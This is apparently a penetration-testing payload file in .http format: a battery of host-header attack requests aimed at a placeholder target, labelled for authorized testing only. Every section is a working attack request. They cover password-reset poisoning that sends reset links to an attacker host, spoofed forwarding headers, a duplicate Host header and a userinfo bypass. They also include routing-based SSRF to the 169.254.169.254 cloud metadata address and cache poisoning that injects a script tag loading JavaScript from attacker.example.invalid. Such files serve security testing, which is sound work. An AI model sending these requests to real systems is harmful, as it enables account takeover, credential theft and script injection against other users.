# ============================================================================
# Safe PoC -> x8bitranjit
# Host-header attack battery (.http format) - reset poisoning / cache / SSRF.
# Authorized testing only. WHAT TO EDIT: target.example.invalid + real sinks (HOST-001 map).
# KIT CROSS-REF: HostHeader_CHECKLIST rows 003-010.
# ============================================================================

### 1) baseline: is the host reflected/used?
GET / HTTP/1.1
Host: target.example.invalid
X-Forwarded-Host: hh-probe.example.invalid

### 2) password-reset poisoning -> ATO (send to your own inbox first)
POST /forgot-password HTTP/1.1
Host: target.example.invalid
X-Forwarded-Host: attacker.example.invalid
Content-Type: application/json

{"email":"YOUR-TEST@example.invalid"}

### 3) spoofing header battery (try each in turn)
GET / HTTP/1.1
Host: target.example.invalid
X-Forwarded-Host: evil.example.invalid

###
GET / HTTP/1.1
Host: target.example.invalid
X-Host: evil.example.invalid

###
GET / HTTP/1.1
Host: target.example.invalid
X-HTTP-Host-Override: evil.example.invalid

### 4) duplicate Host (proxy/front-end disagreement)
GET / HTTP/1.1
Host: target.example.invalid
Host: evil.example.invalid

### 5) port/userinfo validation bypass
GET / HTTP/1.1
Host: target.example.invalid:80@evil.example.invalid

### 6) routing-based SSRF (front-end routes by Host)
GET / HTTP/1.1
Host: 169.254.169.254

### 7) web cache poisoning via unkeyed XFH (verify a SECOND clean request
###    still receives the poisoned response - that is the proof)
GET /?cb=hhpoison1 HTTP/1.1
Host: target.example.invalid
X-Forwarded-Host: a"><script src=//attacker.example.invalid/x.js></script>

### 8) absolute-URI request line (overrides Host at some front-ends)
GET https://evil.example.invalid/ HTTP/1.1
Host: target.example.invalid
